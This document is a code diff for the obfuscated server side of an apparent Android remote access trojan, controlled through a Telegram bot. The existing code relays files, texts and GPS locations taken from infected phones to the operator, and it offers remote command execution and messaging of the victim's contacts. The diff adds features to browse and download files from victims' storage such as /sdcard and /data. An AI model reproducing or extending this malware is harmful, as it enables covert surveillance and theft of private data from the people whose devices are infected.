@@ -23,9 +23,12 @@ app.use(bodyParser.json());
 let currentUuid = '';
 let currentNumber = '';
 let currentTitle = '';
+let currentPath = ''; // added for file explore
+
 app.get("/", function (_0x1b89da, _0x3398a0) {
   _0x3398a0.send("<h1 align=\"center\">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>");
 });
+
 app.post("/uploadFile", upload.single("file"), (_0x1c67cf, _0x143a37) => {
   const _0x404b56 = _0x1c67cf.file.originalname;
   appBot.sendDocument(id, _0x1c67cf.file.buffer, {
@@ -37,12 +40,14 @@ app.post("/uploadFile", upload.single("file"), (_0x1c67cf, _0x143a37) => {
   });
   _0x143a37.send('');
 });
+
 app.post("/uploadText", (_0x5a02f5, _0x55205a) => {
   appBot.sendMessage(id, "°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>" + _0x5a02f5.headers.model + "</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n" + _0x5a02f5.body.text, {
     "parse_mode": "HTML"
   });
   _0x55205a.send('');
 });
+
 app.post("/uploadLocation", (_0xfc380d, _0x48b391) => {
   appBot.sendLocation(id, _0xfc380d.body.lat, _0xfc380d.body.lon);
   appBot.sendMessage(id, "°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>" + _0xfc380d.headers.model + "</b> 𝙙𝙚𝙫𝙞𝙘𝙚", {
@@ -50,6 +55,7 @@ app.post("/uploadLocation", (_0xfc380d, _0x48b391) => {
   });
   _0x48b391.send('');
 });
+
 appSocket.on("connection", (_0x466cd0, _0x1cf0ae) => {
   const _0x275c2d = uuid4.v4();
   const _0x2cfd1d = _0x1cf0ae.headers.model;
@@ -75,6 +81,7 @@ appSocket.on("connection", (_0x466cd0, _0x1cf0ae) => {
     appClients["delete"](_0x466cd0.uuid);
   });
 });
+
 appBot.on("message", _0x2ca88f => {
   const _0x32d1ff = _0x2ca88f.chat.id;
   if (_0x2ca88f.reply_to_message) {
@@ -118,6 +125,42 @@ appBot.on("message", _0x2ca88f => {
         }
       });
     }
+    // ========== NEW: FILE EXPLORE REPLY ==========
+    if (_0x2ca88f.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙩𝙤 𝙚𝙭𝙥𝙡𝙤𝙧𝙚")) {
+      const _0xexplorePath = _0x2ca88f.text;
+      appSocket.clients.forEach(function _0xexploreSend(_0xclient) {
+        if (_0xclient.uuid == currentUuid) {
+          _0xclient.send("explore:" + _0xexplorePath);
+        }
+      });
+      currentUuid = '';
+      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
+        "parse_mode": "HTML",
+        "reply_markup": {
+          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+          "resize_keyboard": true
+        }
+      });
+    }
+    // ========== NEW: FILE DOWNLOAD REPLY ==========
+    if (_0x2ca88f.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙")) {
+      const _0xdownloadPath = _0x2ca88f.text;
+      appSocket.clients.forEach(function _0xdownloadSend(_0xclient) {
+        if (_0xclient.uuid == currentUuid) {
+          _0xclient.send("download:" + _0xdownloadPath);
+        }
+      });
+      currentUuid = '';
+      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ, DEVELOPED BY @MOGATEAM & @shivayadavv", {
+        "parse_mode": "HTML",
+        "reply_markup": {
+          "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+          "resize_keyboard": true
+        }
+      });
+    }
+    // ========== END OF NEW REPLIES ==========
+    
     if (_0x2ca88f.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙")) {
       const _0x500514 = _0x2ca88f.text;
       appSocket.clients.forEach(function _0x5ccade(_0x1bb0ba) {
@@ -301,6 +344,7 @@ appBot.on("message", _0x2ca88f => {
     appBot.sendMessage(id, "°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙");
   }
 });
+
 appBot.on("callback_query", _0x425827 => {
   const _0x440ba5 = _0x425827.message;
   const _0x9f09ec = _0x425827.data;
@@ -370,7 +414,17 @@ appBot.on("callback_query", _0x425827 => {
         }], [{
           "text": "𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨",
           "callback_data": "send_message_to_all:" + _0x39894d
-        }]]
+        }],
+        // ========== NEW: EXPLORE & DOWNLOAD BUTTONS ==========
+        [{
+          "text": "𝙁𝙞𝙡𝙚 𝙀𝙭𝙥𝙡𝙤𝙧𝙚",
+          "callback_data": "explore:" + _0x39894d
+        }, {
+          "text": "𝘿𝙤𝙬𝙣𝙡𝙤𝙖𝙙",
+          "callback_data": "download_file:" + _0x39894d
+        }]
+        // ========== END NEW BUTTONS ==========
+        ]
       },
       "parse_mode": "HTML"
     });
@@ -618,7 +672,32 @@ appBot.on("callback_query", _0x425827 => {
     });
     currentUuid = _0x39894d;
   }
+  
+  // ========== NEW: EXPLORE CALLBACK ==========
+  if (_0x2f3f8b == "explore") {
+    appBot.deleteMessage(id, _0x440ba5.message_id);
+    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙩𝙤 𝙚𝙭𝙥𝙡𝙤𝙧𝙚\n\n• ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ <b>/sdcard</b> ᴏʀ <b>/data</b>", {
+      "reply_markup": {
+        "force_reply": true
+      },
+      "parse_mode": "HTML"
+    });
+    currentUuid = _0x39894d;
+  }
+  // ========== NEW: DOWNLOAD CALLBACK ==========
+  if (_0x2f3f8b == "download_file") {
+    appBot.deleteMessage(id, _0x440ba5.message_id);
+    appBot.sendMessage(id, "°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙\n\n• ᴇxᴀᴍᴘʟᴇ: <b>/sdcard/DCIM/image.jpg</b>", {
+      "reply_markup": {
+        "force_reply": true
+      },
+      "parse_mode": "HTML"
+    });
+    currentUuid = _0x39894d;
+  }
+  // ========== END NEW CALLBACKS ==========
 });
+
 setInterval(function () {
   appSocket.clients.forEach(function _0x3b936c(_0x41c8f7) {
     _0x41c8f7.send("ping");
